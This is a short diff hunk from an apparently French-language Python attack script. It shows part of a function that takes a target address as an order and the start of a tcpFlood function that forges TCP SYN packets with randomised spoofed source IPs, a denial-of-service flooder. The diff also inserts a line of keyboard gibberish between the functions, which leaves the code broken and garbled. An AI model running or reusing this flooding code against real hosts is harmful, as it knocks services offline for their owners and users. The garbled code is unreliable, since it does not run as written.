@@ -83,7 +83,7 @@ def askOrder():
 		else:
 			print('Erreur, cible incorrect: "{}"\nNouvel essai dans 1 minute'.format(ipport))
 
-
+ijoegkrbjhetgpoefikgdrbjfnlmo,kefp
 def tcpFlood(cible):
 	ip = IP(src=RandIP("192.168.1.1/24"), dst=cible)
 	# forge a TCP SYN packet 
